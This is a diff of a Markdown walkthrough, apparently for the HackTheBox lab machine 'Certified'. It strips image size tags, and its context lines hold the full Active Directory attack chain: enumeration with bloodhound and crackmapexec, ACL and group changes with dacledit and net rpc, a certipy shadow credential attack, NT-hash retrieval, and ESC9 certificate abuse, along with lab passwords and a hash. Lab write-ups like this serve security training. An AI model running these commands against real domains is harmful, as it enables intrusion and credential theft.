@@ -20,8 +20,7 @@ Password: judith09**
 
 3.  **Rerun** with verbose set. **RUN:** **nmap -sV -Pn -v 10.10.11.41**
 
-> ![](images/media/image2.png){width="5.557291119860017in"
-> height="3.735530402449694in"}
+> ![](images/media/image2.png)
 >
 > OR
 >
@@ -38,8 +37,7 @@ Password: judith09**
 > **[INFO:]{.mark} By pushing SPACE key during scan, you can see what's
 > going on during the scans**
 >
-> ![](images/media/image3.png){width="5.0363681102362206in"
-> height="4.723957786526684in"}
+> ![](images/media/image3.png)
 
 4.  **Get all User names**
 
@@ -52,8 +50,7 @@ Password: judith09**
 > **RUN:** **crackmapexec smb certified.htb -u \"judith.mader\" -p
 > \"judith09\" \--rid-brute \| grep SidTypeUser**
 >
-> ![](images/media/image4.png){width="5.5569444444444445in"
-> height="1.150029527559055in"}
+> ![](images/media/image4.png)
 
 5.  **Bloodhound**
 
@@ -65,8 +62,7 @@ Password: judith09**
 > **RUN: bloodhound-python -u judith.mader -p \'judith09\' -c All -d
 > certified.htb -ns 10.10.11.41**
 >
-> ![](images/media/image5.png){width="6.2972222222222225in"
-> height="1.7659722222222223in"}
+> ![](images/media/image5.png)
 >
 > **[Error: Failed to get Kerberos TGT]{.mark}**
 >
@@ -79,37 +75,33 @@ Password: judith09**
 > **1^st^ Rerun:** **bloodhound-python -u judith.mader -p \'judith09\'
 > -c All -d certified.htb -ns 10.10.11.41**
 >
-> ![](images/media/image6.png){width="6.2868055555555555in"
-> height="5.0055555555555555in"}
+> ![](images/media/image6.png)
 >
 > ![](images/media/image7.png){width="5.0in"
 > height="1.462810586176728in"}
 >
 > **[(this fixed the ERROR)]{.mark} RUN:** **sudo ntpdate 10.10.11.41**
 >
-> ![](images/media/image8.png){width="3.7031244531933507in"
-> height="0.7138353018372703in"}
+> ![](images/media/image8.png)
 >
 > **[WORKING]{.mark}** (NO ERRORS) at **2^nd^ Rerun**:
 > **bloodhound-python -u judith.mader -p \'judith09\' -c All -d
 > certified.htb -ns 10.10.11.41**
 >
-> ![](images/media/image9.png){width="4.15625in"
-> height="1.6569083552055992in"}
+> ![](images/media/image9.png)
 
 6.  Import all JSON-files into BloodhoundGUI for analysis
 
 > **INFO:** The JSON-files will be located in the same directory, as the
 > Terminal was started in.
 >
-> ![](images/media/image10.png){width="6.2972222222222225in"
-> height="2.651388888888889in"}
+> ![](images/media/image10.png)
 >
 > Bloodhound missing? -\> installation GUIDE
 > <https://www.kali.org/tools/bloodhound/>
 >
-> **6.1 RUN:** **sudo neo4j console [INFO: ]{.mark}**[without this, you
-> cannot connect to Database!]{.mark}
+> **6.1 RUN:** **sudo neo4j console INFO:**without this, you
+> cannot connect to Database!
 >
 > **6.2** Open address in Browser and change default Password:
 > **localhost:7474/browser**
@@ -119,13 +111,11 @@ Password: judith09**
 >
 > Drag & Drop JSON files. Go to Analysis TAB or search directly
 >
-> ![](images/media/image11.png){width="6.302083333333333in"
-> height="2.7708333333333335in"}
+> ![](images/media/image11.png)
 >
 > **Direct search**. Type user:USERNAME or group:GROUPNAME
 >
-> ![](images/media/image12.png){width="3.505207786526684in"
-> height="1.1923458005249343in"}
+> ![](images/media/image12.png)
 >
 > **IMPORTANT:** Generic All, Generic Write relations should be
 > displayed
@@ -135,8 +125,7 @@ Password: judith09**
 > Judith can change OWNER of a group, or modify **ACL Access Control
 > List**
 >
-> ![](images/media/image13.png){width="5.729166666666667in"
-> height="3.528559711286089in"}
+> ![](images/media/image13.png)
 
 8.  Check
     [**management@certified.htb**](mailto:management@certified.htb)
@@ -144,29 +133,24 @@ Password: judith09**
 > **INFO: Generic Write**: The management group **can write to the
 > SVCs**.
 >
-> ![](images/media/image14.png){width="2.3906244531933507in"
-> height="0.9303138670166229in"}
+> ![](images/media/image14.png)
 >
 > **Management** has FULL CONTROL (Generic All) over **Management_SVC**
 >
-> ![](images/media/image15.png){width="5.767551399825022in"
-> height="4.083333333333333in"}
+> ![](images/media/image15.png)
 
 9.  Check
     [**management_SVC@certified.htb**](mailto:management_SVC@certified.htb)
 
-> ![](images/media/image16.png){width="4.162630139982502in"
-> height="2.46875in"}
+> ![](images/media/image16.png)
 >
 > **Management_SVC** has FULL CONTROL (Generic All) over **CA_Operator**
 >
-> ![](images/media/image17.png){width="4.895833333333333in"
-> height="2.9747856517935256in"}
+> ![](images/media/image17.png)
 
 10. Lone's overview INFO: Look for Domain Controller
 
-> ![](images/media/image18.png){width="6.2868055555555555in"
-> height="1.9791666666666667in"}
+> ![](images/media/image18.png)
 
 **[User - Foothold]{.underline}**
 
@@ -180,11 +164,9 @@ Password: judith09**
 > \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
 > Mader,CN=Users,DC=certified,DC=htb\"**
 >
-> ![](images/media/image19.png){width="6.2972222222222225in"
-> height="0.3909722222222222in"}
+> ![](images/media/image19.png)
 >
-> ![](images/media/image20.png){width="3.170615704286964in"
-> height="1.0854199475065618in"}
+> ![](images/media/image20.png)
 
 2.  Add **Generic All for Judith.Mader on MANAGEMENT**
 
@@ -193,11 +175,9 @@ Password: judith09**
 > \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
 > Mader,CN=Users,DC=certified,DC=htb\"**
 >
-> ![](images/media/image21.png){width="6.2972222222222225in"
-> height="0.3909722222222222in"}
+> ![](images/media/image21.png)
 >
-> ![](images/media/image22.png){width="3.2274879702537183in"
-> height="1.0732195975503063in"}
+> ![](images/media/image22.png)
 
 3.  Add **Group Member**
 
@@ -208,8 +188,7 @@ Password: judith09**
 > \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
 > Mader,CN=Users,DC=certified,DC=htb\"**
 >
-> ![](images/media/image23.png){width="6.2972222222222225in"
-> height="0.38055555555555554in"}
+> ![](images/media/image23.png)
 
 4.  Add **Judith.Mader to the Management group**
 
@@ -220,8 +199,7 @@ Password: judith09**
 > \"certified.htb\"/\"judith.mader\"%\"judith09\" -S
 > \"DC01.certified.htb\"**
 >
-> ![](images/media/image24.png){width="6.2972222222222225in"
-> height="0.9013888888888889in"}
+> ![](images/media/image24.png)
 
 5.  **Check** if User Judith.mader is **member of Management group**
 
@@ -230,8 +208,7 @@ Password: judith09**
 > **RUN:** **net rpc group members \"MANAGEMENT\" -U
 > \"certified.htb\"/\"judith.mader\" -S \"certified.htb\"**
 >
-> ![](images/media/image25.png){width="6.302083333333333in"
-> height="0.65625in"}
+> ![](images/media/image25.png)
 
 6.  This command uses **certipy-ad** to perform a **\"shadow credential
     attack\" against the management_svc account** in the certified.htb
@@ -244,8 +221,7 @@ Password: judith09**
 > **RUN:** **certipy-ad shadow add -u \"judith.mader@certified.htb\" -p
 > \'judith09\' -account \"management_svc\" -ns 10.10.11.41**
 >
-> ![](images/media/image26.png){width="6.2972222222222225in"
-> height="0.9791666666666666in"}
+> ![](images/media/image26.png)
 
 7.  TGT: Then **request the TGT ticket, using certificate for
     MANAGEMENT_SVC account**. If an error occurs, use ntpdate to
@@ -271,8 +247,7 @@ Password: judith09**
 >
 > **Minikerberos : AS-REP encryption key**
 >
-> ![](images/media/image27.png){width="6.291666666666667in"
-> height="5.307638888888889in"}
+> ![](images/media/image27.png)
 
 8.  Get **NT-HASH (NTLM)**
 
@@ -295,8 +270,7 @@ Password: judith09**
 >
 > **Solution:** Resync clock, see screenshot below.
 >
-> ![](images/media/image28.png){width="6.2868055555555555in"
-> height="3.3854166666666665in"}
+> ![](images/media/image28.png)
 
 9.  With NThash, you can use **REMOTE TOOL to LOGIN REMOTELY** (USER:
     management_svc)
@@ -392,8 +366,7 @@ STEP 8**]{.mark}
 >
 > Solution: **Repeat command from STEP 7**
 >
-> ![](images/media/image30.png){width="6.291666666666667in"
-> height="1.3229166666666667in"}
+> ![](images/media/image30.png)
 
 8.  Then, we **change** **back** the **userPrincipalName** of
     **ca_operator to be something else**, like her original
@@ -404,8 +377,7 @@ STEP 8**]{.mark}
 > \':a091c1832bcdd4677c28b5a6a1295584\' -user ca_operator -upn
 > ca_operator@certified.htb -ns 10.10.11.41**
 >
-> ![](images/media/image31.png){width="6.2868055555555555in"
-> height="0.59375in"}
+> ![](images/media/image31.png)
 
 9.  **[SKIP THIS]{.mark}** Once the UPN is changed, **request a
     certificate to that UPN** .
@@ -454,8 +426,7 @@ STEP 8**]{.mark}
 > **RUN:** **certipy-ad find -u judith.mader@certified.htb -p judith09
 > -dc-ip 10.10.11.41**
 >
-> ![](images/media/image32.png){width="2.9375in"
-> height="1.868409886264217in"}
+> ![](images/media/image32.png)
 
 13. NoSecurityExtension exists, see screenshot, so **ESC9 can be used to
     attack**.
